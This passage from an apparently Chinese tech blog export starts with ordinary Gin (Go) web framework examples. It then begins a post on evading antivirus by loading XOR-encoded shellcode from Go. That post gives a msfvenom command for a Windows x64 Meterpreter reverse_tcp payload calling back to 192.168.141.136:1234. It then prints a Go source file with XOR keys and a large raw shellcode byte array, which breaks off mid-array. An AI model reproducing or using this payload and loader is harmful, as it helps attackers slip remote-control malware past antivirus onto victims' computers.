class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">auth:=router.Group(<span class="string">"/admin"</span>,gin.BasicAuth(gin.Accounts{</span><br><span class="line"><span class="string">"admin"</span>:<span class="string">"admin"</span>,</span><br><span class="line">}))</span><br><span class="line">auth.GET(<span class="string">"/login"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"success"</span>:c.MustGet(gin.AuthUserKey).(<span class="keyword">string</span>),</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="自定义中间件-1"><a href="#自定义中间件-1" class="headerlink" title="自定义中间件"></a>自定义中间件</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Logger</span><span class="params">()</span> <span class="title">gin</span>.<span class="title">HandlerFunc</span></span> {</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">t := time.Now()</span><br><span class="line"></span><br><span class="line"><span class="comment">// before request</span></span><br><span class="line">c.Next()</span><br><span class="line"><span class="comment">// after request</span></span><br><span class="line"></span><br><span class="line">log.Print(<span class="string">"------------------------------------------------------------------------"</span>)</span><br><span class="line">log.Print(c.Request.Method)</span><br><span class="line">log.Print(c.Request.Proto)</span><br><span class="line">log.Print(c.Request.Host)</span><br><span class="line">log.Print(c.Request.UserAgent())</span><br><span class="line">log.Print(time.Since(t))</span><br><span class="line">log.Println(c.Writer.Status())</span><br><span class="line">log.Print(<span class="string">"------------------------------------------------------------------------"</span>)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.New()</span><br><span class="line">r.Use(Logger())</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">"/test"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">example := c.MustGet(<span class="string">"example"</span>).(<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// it would print: "12345"</span></span><br><span class="line">log.Println(example)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// Listen and serve on 0.0.0.0:8080</span></span><br><span class="line">r.Run(<span class="string">":8080"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="自定义http配置"><a href="#自定义http配置" class="headerlink" title="自定义http配置"></a>自定义http配置</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">"/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.String(<span class="number">200</span>,<span class="string">"test"</span>)</span><br><span class="line">})</span><br><span class="line">s:=&amp;http.Server{</span><br><span class="line">Addr:              <span class="string">"0.0.0.0:7777"</span>,</span><br><span class="line">Handler:           router,</span><br><span class="line">ReadTimeout:       <span class="number">60</span>*time.Second,</span><br><span class="line">ReadHeaderTimeout: <span class="number">60</span>*time.Second,</span><br><span class="line">WriteTimeout:      <span class="number">60</span>*time.Second,</span><br><span class="line">MaxHeaderBytes:    <span class="number">1</span>&lt;&lt;<span class="number">10</span>,</span><br><span class="line">}</span><br><span class="line">s.ListenAndServe()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="启动多个服务"><a href="#启动多个服务" class="headerlink" title="启动多个服务"></a>启动多个服务</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line"><span class="string">"golang.org/x/sys/sync/errgroup"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g errgroup.Group</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">server1</span><span class="params">()</span> <span class="title">http</span>.<span class="title">Handler</span></span>{</span><br><span class="line">r:=gin.New()</span><br><span class="line">r.Use(gin.Recovery())</span><br><span class="line">r.GET(<span class="string">"/test1"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"server"</span>:<span class="string">"1"</span>,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">server2</span><span class="params">()</span> <span class="title">http</span>.<span class="title">Handler</span></span>{</span><br><span class="line">r:=gin.New()</span><br><span class="line">r.Use(gin.Recovery())</span><br><span class="line">r.GET(<span class="string">"/test2"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"server"</span>:<span class="string">"2"</span>,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">s1:=&amp;http.Server{</span><br><span class="line">Addr:              <span class="string">"0.0.0.0:1111"</span>,</span><br><span class="line">Handler:           server1(),</span><br><span class="line">ReadTimeout:       <span class="number">60</span>*time.Second,</span><br><span class="line">WriteTimeout:      <span class="number">60</span>*time.Second,</span><br><span class="line">MaxHeaderBytes:    <span class="number">1</span>&lt;&lt;<span class="number">10</span>,</span><br><span class="line">}</span><br><span class="line">s2:=&amp;http.Server{</span><br><span class="line">Addr:              <span class="string">"0.0.0.0:2222"</span>,</span><br><span class="line">Handler:           server2(),</span><br><span class="line">ReadTimeout:       <span class="number">60</span>*time.Second,</span><br><span class="line">WriteTimeout:      <span class="number">60</span>*time.Second,</span><br><span class="line">MaxHeaderBytes:    <span class="number">1</span>&lt;&lt;<span class="number">10</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">g.Go(<span class="function"><span class="keyword">func</span><span class="params">()</span><span class="title">error</span></span>{</span><br><span class="line"><span class="keyword">return</span> s1.ListenAndServe()</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">g.Go(<span class="function"><span class="keyword">func</span><span class="params">()</span><span class="title">error</span></span>{</span><br><span class="line"><span class="keyword">return</span> s2.ListenAndServe()</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err:=g.Wait();err!=<span class="literal">nil</span>{</span><br><span class="line">log.Fatalln(err.Error())</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="自定义路由日志格式"><a href="#自定义路由日志格式" class="headerlink" title="自定义路由日志格式"></a>自定义路由日志格式</h3><blockquote><p>我们可以使用<code>gin.DebugPrintRouteFunc</code>来定义格式</p></blockquote><p>默认的路由是这样子的<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[GIN-debug] GET    /                         --&gt; main.main.func1 (3 handlers)</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">gin.DebugPrintRouteFunc = <span class="function"><span class="keyword">func</span><span class="params">(httpMethod, absolutePath, handlerName <span class="keyword">string</span>, nuHandlers <span class="keyword">int</span>)</span></span>{</span><br><span class="line">log.Printf(<span class="string">"%v %v %v %v\n"</span>,httpMethod,absolutePath,handlerName,nuHandlers)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">"/test"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">c.JSON(http.StatusOK, gin.H{</span><br><span class="line"><span class="string">"status"</span>:<span class="string">"ok"</span>,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="设置Cookie"><a href="#设置Cookie" class="headerlink" title="设置Cookie"></a>设置Cookie</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">"/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">cookie,err:=c.Cookie(<span class="string">"GOSESSID"</span>)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>{</span><br><span class="line">c.SetCookie(<span class="string">"GOSESSID"</span>,<span class="string">"TestCookie"</span>,<span class="number">3600</span>, <span class="string">"/"</span>, <span class="string">"localhost"</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">}</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"Cookie"</span>:cookie,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> Gin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用golang加载异或的shellcode免杀</title>
      <link href="/2019/12/20/%E4%BD%BF%E7%94%A8golang%E5%8A%A0%E8%BD%BD%E5%BC%82%E6%88%96%E7%9A%84shellcode%E5%85%8D%E6%9D%80/"/>
      <url>/2019/12/20/%E4%BD%BF%E7%94%A8golang%E5%8A%A0%E8%BD%BD%E5%BC%82%E6%88%96%E7%9A%84shellcode%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<p>用Python加载<code>shellcode</code>能有一定的免杀效果想必已经<strong>老生常谈</strong>了，然后我就突发奇想，如果用go加载shellcode能不能达到python那样的效果呢</p><p>用<code>msfvenom</code>生成一段<code>shellcode</code><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f num LHOST=192.168.141.136 LPORT=1234</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里要注意一点：如果我们直接用go加载<code>shellcode</code>，会被部分av查杀，例如：火绒、<code>windows Defender</code>等等</p><p>先把我们的shellcode异或一下，然后再加载。<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">KEY_1 = <span class="number">55</span></span><br><span class="line">KEY_2 = <span class="number">66</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">shellcode := []<span class="keyword">byte</span>{<span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe4</span>, <span class="number">0xf0</span>, <span class="number">0xe8</span>, <span class="number">0xcc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, </span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x4a</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0xe2</span>, <span class="number">0xed</span>, <span class="number">0x52</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x8b</span>, <span class="number">0x42</span>, <span class="number">0x3c</span>, <span class="number">0x48</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0x78</span>, <span class="number">0x18</span>, <span class="number">0x0b</span>, <span class="number">0x02</span>, <span class="number">0x0f</span>, <span class="number">0x85</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>, </span><br><span class="line"><span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x67</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x8b</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x18</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0xe3</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, </span><br><span class="line"><span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf1</span>, <span class="number">0x4c</span>, <span class="number">0x03</span>, <span class="number">0x4c</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x45</span>, </span><br><span class="line"><span class="number">0x39</span>, <span class="number">0xd1</span>, <span class="number">0x75</span>, <span class="number">0xd8</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x24</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, </span><br><span class="line"><span class="number">0x0c</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x1c</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, </span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, </span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xe9</span>, </span><br><span class="line"><span class="number">0x4b</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x5d</span>, <span class="number">0x49</span>, <span class="number">0xbe</span>, <span class="number">0x77</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x5f</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xec</span>, <span class="number">0xa0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, </span><br><span class="line"><span class="number">0x49</span>, <span class="number">0xbc</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0xd2</span>, <span class="number">0xc0</span>, <span class="number">0xa8</span>, <span class="number">0x8d</span>, <span class="number">0x88</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe4</span>, </span><br><span class="line"><span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xf1</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x68</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x6b</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x0a</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x5e</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, </span><br><span class="line"><span class="number">0xc2</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0xea</span>, <span class="number">0x0f</span>, <span class="number">0xdf</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x6a</span>, <span class="number">0x10</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, </span><br><span class="line"><span class="number">0x99</span>, <span class="number">0xa5</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xce</span>, <span class="number">0x75</span>, <span class="number">0xe5</span>, </span><br><span class="line"><span class="number">0xe8</span>, <span class="number">0x93</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, </span><br><span class="line"><span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, </span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xf8</span>, <span class="number">0x00</span>, <span class="number">0x7e</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x20</span>, <span class="number">0x5e</span>, <span class="number">0x89</span>, <span class="number">0xf6</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span 